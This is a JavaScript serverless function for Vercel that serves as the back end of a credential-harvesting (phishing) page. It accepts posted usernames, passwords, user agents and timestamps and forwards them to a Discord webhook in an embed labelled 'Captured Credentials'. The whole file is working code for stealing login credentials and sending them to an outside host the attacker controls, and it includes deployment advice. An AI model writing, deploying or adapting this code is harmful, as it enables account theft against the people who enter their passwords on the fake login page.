// This is a Vercel Serverless Function.
// It runs whenever a request is made to your-site.com/api/log

export default async function handler(req, res) {
    // Only allow POST requests
    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Method Not Allowed' });
    }

    try {
        const { username, password, userAgent, timestamp } = req.body;

        // --- Validate the data (optional but good practice) ---
        if (!username || !password) {
            return res.status(400).json({ message: 'Username and password are required.' });
        }

        // --- Prepare the payload for Discord ---
        const discordPayload = {
            content: `🚨 **New Login Attempt** 🚨`,
            embeds: [{
                title: "Captured Credentials",
                color: 0xff0000, // Red color
                fields: [
                    {
                        name: "👤 Username / Email",
                        value: `\`\`\`${username}\`\`\``,
                        inline: false
                    },
                    {
                        name: "🔑 Password",
                        value: `\`\`\`${password}\`\`\``,
                        inline: false
                    },
                    {
                        name: "🕐 Timestamp",
                        value: timestamp,
                        inline: true
                    },
                    {
                        name: "🌐 User Agent",
                        value: `\`\`\`${userAgent}\`\`\``,
                        inline: true
                    }
                ]
            }]
        };

        // --- Send the data to your Discord Webhook ---
        // IMPORTANT: Use an environment variable for the webhook URL.
        // Do NOT paste it directly here in production code.
        const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

        // Check if the webhook URL is configured
        if (!DISCORD_WEBHOOK_URL) {
            console.error('DISCORD_WEBHOOK_URL is not set in environment variables.');
            // Return a server error to the client
            return res.status(500).json({ message: 'Server configuration error.' });
        }

        const discordResponse = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(discordPayload),
        });

        // --- Final Logic ---
        // Check if Discord accepted the payload
        if (!discordResponse.ok) {
            // Log the detailed error from Discord for debugging
            const errorBody = await discordResponse.text();
            console.error('Failed to send to Discord:', discordResponse.status, errorBody);
            
            // Return a server error to the client, but don't expose the specific error
            return res.status(500).json({ message: 'Failed to log data.' });
        }

        // If everything worked, send a success response to the frontend
        // The `fetch` call in index.html will see this `res.ok === true` (status 200)
        return res.status(200).json({ message: 'Log received successfully.' });

    } catch (error) {
        console.error('An unexpected error occurred in the API function:', error);
        // Catch any other unexpected errors and return a generic server error
        return res.status(500).json({ message: 'An internal server error occurred.' });
    }
}